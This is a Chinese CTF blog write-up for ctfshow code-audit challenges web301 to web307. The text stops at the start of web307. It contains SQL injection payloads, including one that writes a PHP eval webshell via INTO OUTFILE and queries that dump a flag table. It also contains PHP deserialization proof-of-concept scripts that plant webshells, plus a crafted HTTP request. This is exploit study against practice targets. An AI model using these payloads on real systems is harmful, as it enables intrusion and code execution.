@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/acvtar.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/acvtar.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/acvtar.jpg">
+  <link rel="mask-icon" href="/images/acvtar.jpg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.css" integrity="sha256-yE0aDX61mjiw8FoDuGetFttFoGJMeWsU/iYEFOfpMhA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"baozongwi.xyz","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="最最最基础的php待审">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow代码审计">
+<meta property="og:url" content="https://baozongwi.xyz/posts/87d475f3.html">
+<meta property="og:site_name" content="baozongwi:H@cking Th3 Fu1ure">
+<meta property="og:description" content="最最最基础的php待审">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-141457.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-143100.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-145000.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-145206.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-150549.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-150724.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-150702.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-154407.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-154809.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-160854.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-155501.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-170648.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-170745.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-170852.png">
+<meta property="article:published_time" content="2024-10-08T06:06:33.000Z">
+<meta property="article:modified_time" content="2025-08-08T03:58:42.730Z">
+<meta property="article:author" content="baozongwi">
+<meta property="article:tag" content="php">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://baozongwi.xyz/images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-141457.png">
+
+
+<link rel="canonical" href="https://baozongwi.xyz/posts/87d475f3.html">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://baozongwi.xyz/posts/87d475f3.html","path":"posts/87d475f3.html","title":"ctfshow代码审计"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ctfshow代码审计 | baozongwi:H@cking Th3 Fu1ure</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.umd.js" integrity="sha256-32A/chfN6JgQkwK/QFZY8siVcOZj3LUt1vSKIcDvshM=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js" defer></script>
+
+  <script src="/js/third-party/pace.js" defer></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="baozongwi:H@cking Th3 Fu1ure" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">baozongwi:H@cking Th3 Fu1ure</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>links</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web301"><span class="nav-number">1.</span> <span class="nav-text">web301</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web302"><span class="nav-number">2.</span> <span class="nav-text">web302</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web303"><span class="nav-number">3.</span> <span class="nav-text">web303</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web304"><span class="nav-number">4.</span> <span class="nav-text">web304</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web305"><span class="nav-number">5.</span> <span class="nav-text">web305</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web306"><span class="nav-number">6.</span> <span class="nav-text">web306</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web307"><span class="nav-number">7.</span> <span class="nav-text">web307</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web308"><span class="nav-number">8.</span> <span class="nav-text">web308</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web309"><span class="nav-number">9.</span> <span class="nav-text">web309</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web310"><span class="nav-number">10.</span> <span class="nav-text">web310</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">11.</span> <span class="nav-text">小结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="baozongwi"
+      src="/images/acvtar.jpg">
+  <p class="site-author-name" itemprop="name">baozongwi</p>
+  <div class="site-description" itemprop="description">天地不仁，以万物为刍狗</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">202</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/baozongwi" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;baozongwi" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:baozongwi@qq.com" title="E-Mail → mailto:baozongwi@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+<ul>
+  <li><a href="/"><i class="fa fa-home"></i> home</a></li>
+  <li><a href="/archives/"><i class="fa fa-archive"></i> archives</a></li>
+  <li><a href="/tags/"><i class="fa fa-tags"></i> tags</a></li>
+  <li><a href="/about/"><i class="fa fa-user"></i> about</a></li>
+  <li><a href="/links/"><i class="fa fa-link"></i> links</a></li>
+</ul>
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://baozongwi.xyz/posts/87d475f3.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/acvtar.jpg">
+      <meta itemprop="name" content="baozongwi">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="baozongwi:H@cking Th3 Fu1ure">
+      <meta itemprop="description" content="天地不仁，以万物为刍狗">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="ctfshow代码审计 | baozongwi:H@cking Th3 Fu1ure">
+      <meta itemprop="description" content="最最最基础的php待审">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctfshow代码审计
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2024-10-08 14:06:33" itemprop="dateCreated datePublished" datetime="2024-10-08T14:06:33+08:00">2024-10-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-08-08 11:58:42" itemprop="dateModified" datetime="2025-08-08T11:58:42+08:00">2025-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctfshow/" itemprop="url" rel="index"><span itemprop="name">ctfshow</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>12k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>20 mins.</span>
+    </span>
+</div>
+
+            <div class="post-description">最最最基础的php待审</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="web301"><a href="#web301" class="headerlink" title="web301"></a>web301</h1><p>进来之后就看到一个函数<code>sds_decode</code>，但是在这个文件里面都没找到利用这个函数的地方，然后发现sql注入直接写入木马</p>
+<p><img src="/../images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-141457.png" alt="1"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">userid=a&#x27;union select &#x27;&lt;?php eval(\$_POST[a]);?&gt;&#x27;into outfile &quot;/var/www/html/a.php&quot;%23&amp;userpwd=a</span><br></pre></td></tr></table></figure>
+
+<p>这里直接写的时候发现不能用，写是写进去了，那么转义一下就可以了</p>
+<h1 id="web302"><a href="#web302" class="headerlink" title="web302"></a>web302</h1><p>没看出来和上道有什么区别一样的写马就行了</p>
+<h1 id="web303"><a href="#web303" class="headerlink" title="web303"></a>web303</h1><p><img src="/../images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-143100.png" alt="1"></p>
+<p>一个<code>insert</code>注入，但是要登录一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin\admin</span><br></pre></td></tr></table></figure>
+
+<p>然后注入，我想着一样的，但是insert注入不能有union，只有第一个参数不行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dpt_name<span class="operator">=</span>a<span class="string">&#x27;,sds_address =(select group_concat(table_name) from information_schema.tables where table_schema=database())%23</span></span><br><span class="line"><span class="string">sds_dpt,sds_fl9g,sds_user</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">dpt_name=a&#x27;</span>,sds_address <span class="operator">=</span>(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;sds_fl9g&#x27;</span>)<span class="operator">%</span><span class="number">23</span></span><br><span class="line">flag</span><br><span class="line"></span><br><span class="line">dpt_name<span class="operator">=</span>a<span class="string">&#x27;,sds_address =(select flag from sds_fl9g)%23</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="web304"><a href="#web304" class="headerlink" title="web304"></a>web304</h1><p>题目说是增加了<code>waf</code>但是我只看到<code>fun.php</code>有变动，所以还是上面的注入即可</p>
+<h1 id="web305"><a href="#web305" class="headerlink" title="web305"></a>web305</h1><p>一进来就看到class.php可以写文件</p>
+<p><img src="/../images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-145000.png" alt="1"></p>
+<p>然后发现注入的时候上防火墙了，不能注入了，然后我们就找<code>unserialize</code>，发现在这里</p>
+<p><img src="/../images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-145206.png" alt="1"></p>
+<p>写个poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;a.php&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&quot;&lt;?php eval(\$_POST[a]);?&gt;&quot;</span>;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">user</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">GET /login.php HTTP/1.1</span><br><span class="line">Host: 146fed3e-4762-4bb7-bb17-b9ad4d95a128.challenge.ctf.show</span><br><span class="line">Cookie: PHPSESSID=jl2njoaoc5ah8hdioqfci5q1rm;user=O%3A4%3A%22user%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%22a.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5Ba%5D%29%3B%3F%3E%22%3B%7D</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Sec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>不知道为什么会重定向到<code>login.php</code>，不过这里也成功写入了</p>
+<p>找了一会没找到，链接<code>antsword</code>还是没有找到，然后链接数据库找到了</p>
+<h1 id="web306"><a href="#web306" class="headerlink" title="web306"></a>web306</h1><p><code>index.php</code>发现<code>unserialize</code>，<code>login.php</code>也有</p>
+<p><img src="/../images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-150549.png" alt="1"></p>
+<p>然后找链子</p>
+<p><img src="/../images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-150724.png" alt="1"></p>
+<p><img src="/../images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-150702.png" alt="1"></p>
+<p>看懂了吧，写个<code>poc</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$conn</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$title</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$info</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;conn=<span class="keyword">new</span> <span class="title function_ invoke__">log</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;conn-&gt;title=<span class="string">&quot;b.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;conn-&gt;info=<span class="string">&quot;&lt;?php eval(\$_POST[a]);?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//echo $b;</span></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;4%3A%22conn&quot;</span>,<span class="string">&quot;9%3A%22%00dao%00conn&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$c</span>));</span><br></pre></td></tr></table></figure>
+
+<p>这里写法比较特殊，由于<code>private</code>这个修饰词，刚才我还卡了一会因为我直接换成<code>public</code>了，还是挺折磨的，所以还是直接用魔术方法比较方便</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$conn</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;conn=<span class="keyword">new</span> <span class="title function_ invoke__">log</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$title</span>=<span class="string">&quot;c.php&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$info</span>=<span class="string">&quot;&lt;?php eval(\$_POST[a]);?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+
+<h1 id="web307"><a href="#web307" class="headerlink" title="web307"></a>web307</h1><p><img src="/../images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-154407.png" alt="1"></p>
+<p>拼接命令就可以了，找<code>unserialize</code>，发现<code>login</code>\<code>dptadd</code>\<code>dpt</code>\<code>layout</code>都有</p>
+<p><img src="/../images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-154809.png" alt="1"></p>
+<p><img src="/../images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-160854.png" alt="1"></p>
+<p>找一下触发点</p>
+<p><img src="/../images/achieve/202410/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/QQ20241008-155501.png" alt="1"></p>
+<p>所以是两条链子，一个打<code>service</code>一个打<code>dao</code></p>
+<p>第一条</p>
